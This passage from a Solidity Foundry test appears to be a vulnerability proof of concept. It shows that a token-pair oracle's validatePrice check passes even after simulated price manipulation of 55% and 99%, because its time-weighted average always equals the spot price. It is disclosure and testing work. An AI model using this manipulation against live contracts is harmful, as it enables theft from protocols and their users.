    // ===== Step 2: Simulate attacker manipulating price by +55% =====\n        console2.log(\"[Step 2] Attacker manipulates price by +55%\");\n\n        // Attacker buys OLAS -> reserve0 increases, reserve1 decreases\n        // New reserves: 1500e18 secondToken, 667e18 OLAS -> price change ~ -55%\n        pair.setReserves(1500e18, 667e18, uint32(block.timestamp - 50));\n        // Note: blockTimestampLast set in the past to avoid same-block return false\n\n        uint256 manipulatedPrice = oracle.getPrice();\n        console2.log(\"  Manipulated spot price:\", manipulatedPrice);\n        console2.log(\"  Price change: from\", normalPrice, \"to\", manipulatedPrice);\n\n        uint256 priceChangePercent;\n        if (normalPrice > manipulatedPrice) {\n            priceChangePercent = ((normalPrice - manipulatedPrice) * 100) / normalPrice;\n        } else {\n            priceChangePercent = ((manipulatedPrice - normalPrice) * 100) / normalPrice;\n        }\n        console2.log(\"  Price deviation:\", priceChangePercent, \"%\");\n\n        // ===== Step 3: Key verification - validatePrice still returns true after 55%+ manipulation =====\n        console2.log(\"[Step 3] Call validatePrice with 10% slippage after 55%+ manipulation\");\n\n        vm.warp(block.timestamp + 1);\n        bool validAfterManipulation = oracle.validatePrice(10);\n        console2.log(\"  validatePrice(10%) after price manipulation:\", validAfterManipulation);\n\n        // This is the vulnerability proof: price deviated 55%+, but 10% slippage check still passes!\n        assertTrue(validAfterManipulation, \"BUG: validatePrice returns true even after 55%+ price manipulation!\");\n\n        // ===== Step 4: Extreme manipulation - 99% price change =====\n        console2.log(\"[Step 4] Extreme manipulation: 99% price change\");\n\n        pair.setReserves(10000e18, 100e18, uint32(block.timestamp - 50));\n\n        uint256 extremePrice = oracle.getPrice();\n        console2.log(\"  Extreme spot price:\", extremePrice);\n        // 100e18 * 1e18 / 10000e18 = 0.01e18 -> price dropped 99%\n\n        uint256 extremeDeviation;\n        if (normalPrice > extremePrice) {\n            extremeDeviation = ((normalPrice - extremePrice) * 100) / normalPrice;\n        } else {\n            extremeDeviation = ((extremePrice - normalPrice) * 100) / normalPrice;\n        }\n        console2.log(\"  Price deviation from normal:\", extremeDeviation, \"%\");\n\n        vm.warp(block.timestamp + 1);\n        bool validExtreme = oracle.validatePrice(10);\n        console2.log(\"  validatePrice(10%) after 99% manipulation:\", validExtreme);\n\n        assertTrue(validExtreme, \"BUG: Even 99% manipulation passes 10% slippage check!\");\n\n        // ===== Step 5: Mathematical proof =====\n        console2.log(\"\");\n        console2.log(\"[Step 5] Mathematical proof\");\n\n        // Manually reproduce the validatePrice calculation\n        (, , uint32 blockTimestampLast) = pair.getReserves();\n        uint256 elapsedTime = block.timestamp - blockTimestampLast;\n        uint256 tradePrice = oracle.getPrice();\n        uint256 cumulativePriceLast = pair.price1CumulativeLast(); // direction=0 -> use price1\n        uint256 cumulativePrice = cumulativePriceLast + (tradePrice * elapsedTime);\n        uint256 timeWeightedAverage = (cumulativePrice - cumulativePriceLast) / elapsedTime;\n\n        console2.log(\"  tradePrice (spot):\", tradePrice);\n        console2.log(\"  timeWeightedAverage:\", timeWeightedAverage);\n        console2.log(\"  Are they equal?\", tradePrice == timeWeightedAverage);\n\n        assertEq(tradePrice, timeWeightedAverage, \"TWAP is ALWAYS equal to spot price!\");\n\n        uint256 derivation = 0; // tradePrice == timeWeightedAverage -> derivation = 0\n        console2.log(\"  derivation:\", derivation);\n        console2.log(\"  derivation <= slippage (10)?\", derivation <= 10);\n\n        // ===== Conclusion =====\n        console2.log(\"\");\n        